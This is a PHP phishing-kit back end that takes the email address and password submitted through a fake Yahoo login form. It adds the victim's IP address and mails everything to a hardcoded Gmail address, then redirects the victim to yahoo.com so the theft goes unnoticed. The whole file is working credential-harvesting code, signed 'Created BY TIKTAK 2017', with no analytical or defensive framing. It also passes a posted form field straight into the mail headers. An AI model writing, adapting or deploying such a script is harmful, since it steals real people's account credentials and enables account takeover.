<?

$ip = getenv("REMOTE_ADDR");
$message .= "---------= Yahoo Info=---------\n";
$message .= "Email Address: ".$_POST['formtxt1']."\n";
$message .= "Password: ".$_POST['formtxt2']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "---------Created BY TIKTAK 2017---------\n";
$sent ="jhaymasterjhay@gmail.com";


$subject = "Yahoo Login Result".$ip;
$headers = "From: Results Yahoo <ss@ssss.org>";
$headers .= $_POST['formtext1']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}

header("Location: http://yahoo.com");
?>